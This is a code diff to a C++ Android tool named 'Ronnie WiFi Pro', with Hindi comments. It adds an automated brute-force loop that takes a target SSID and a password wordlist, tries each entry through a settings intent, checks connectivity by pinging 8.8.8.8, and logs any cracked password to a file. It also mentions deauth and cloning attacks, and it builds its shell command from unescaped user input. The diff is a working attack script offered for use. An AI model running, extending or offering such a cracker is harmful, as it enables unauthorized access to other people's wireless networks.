@@ -2,6 +2,7 @@
 #include <string>
 #include <fstream>
 #include <unistd.h>
+#include <vector>
 
 using namespace std;
 
@@ -12,21 +13,26 @@ using namespace std;
 #define CYAN    "\033[36m"
 #define BOLD    "\033[1m"
 
+// बिना रूट के कनेक्शन चेक करने का प्रयास
+bool autoCheck() {
+    // 'dumpsys' बिना रूट के सीमित जानकारी देता है, लेकिन हम 'ping' से चेक कर सकते हैं
+    cout << YELLOW << " [Checking Internet Connection...]" << RESET << flush;
+    int res = system("ping -c 1 -W 2 8.8.8.8 > /dev/null 2>&1");
+    return (res == 0);
+}
+
 int main() {
     system("clear");
     cout << CYAN << BOLD << "===========================================" << endl;
-    cout << "      RONNIE WIFI PRO (NON-ROOT MODE)      " << endl;
+    cout << "      RONNIE WIFI PRO (NON-ROOT AUTO)      " << endl;
     cout << "===========================================" << RESET << endl;
-
-    // बिना रूट के स्कैनिंग संभव नहीं है, इसलिए यूजर को मैन्युअली नाम डालना होगा
-    cout << YELLOW << "[!] Note: Non-Root mode me manual SSID jaruri hai." << RESET << endl;
 
     string ssid, wordlist;
     cout << CYAN << "\nEnter Target SSID: " << RESET;
     if (!(cin >> ws)) return 0;
     getline(cin, ssid);
 
-    cout << CYAN << "Wordlist Path (e.g. /sdcard/pass.txt): " << RESET;
+    cout << CYAN << "Wordlist Path: " << RESET;
     if (!(cin >> ws)) return 0;
     getline(cin, wordlist);
 
@@ -36,39 +42,48 @@ int main() {
         return 1;
     }
 
+    // --- Features Note ---
+    cout << RED << "\n[!] Deauth/Cloning requires Monitor Mode (Root Only)." << RESET << endl;
+    cout << YELLOW << "[*] Running Auto-Brute Mode..." << RESET << endl;
+
     string pass;
     int line_count = 0;
-
-    cout << YELLOW << "\n[!] Starting Attack... Har try ke baad WiFi settings khulegi." << RESET << endl;
-    cout << RED << "[!] Non-Root me aapko manually 'Connect' par click karna pad sakta hai." << RESET << endl;
+    bool success = false;
 
     while (getline(file, pass)) {
         line_count++;
         if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
         if (pass.length() < 8) continue;
 
-        cout << CYAN << "[" << line_count << "] TRYING: " << pass << RESET << endl;
+        cout << CYAN << "[" << line_count << "] TRYING: " << pass << flush;
 
         /* 
-           बिना रूट के हम Intent का उपयोग करके वाई-फाई सेटअप स्क्रीन भेज सकते हैं।
-           यह कमांड एंड्रॉइड को उस SSID और पासवर्ड के साथ जोड़ने का निर्देश देती है।
+           Non-Root "Action Connect" Intent: 
+           यह सेटिंग्स को कमांड देता है कि इस नेटवर्क को इस पासवर्ड के साथ सेव करे।
         */
         string cmd = "am start -a android.intent.action.MAIN -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
         system(cmd.c_str());
 
-        // यूजर को चेक करने का समय दें
-        cout << YELLOW << "Check karein ki connect hua ya nahi (y/n): " << RESET;
-        char choice;
-        cin >> choice;
+        // Android को कनेक्ट होने के लिए समय चाहिए
+        cout << " ...waiting 10s..." << flush;
+        sleep(10); 
 
-        if (choice == 'y' || choice == 'Y') {
-            cout << GREEN << BOLD << "\n[+] SUCCESS! Password: " << pass << RESET << endl;
+        if (autoCheck()) {
+            cout << GREEN << BOLD << " >> [SUCCESS!]" << RESET << endl;
+            cout << GREEN << "\n[+] Sahi Password Mil Gaya: " << pass << RESET << endl;
+            
             ofstream save("found_pass.txt", ios::app);
             save << "SSID: " << ssid << " | PASS: " << pass << endl;
             save.close();
+            
+            success = true;
             break;
+        } else {
+            cout << RED << " >> [FAILED/TIMEOUT]" << RESET << endl;
         }
     }
+
+    if (!success) cout << RED << "\n[-] Attack complete. Password nahi mila." << RESET << endl;
 
     file.close();
     return 0;
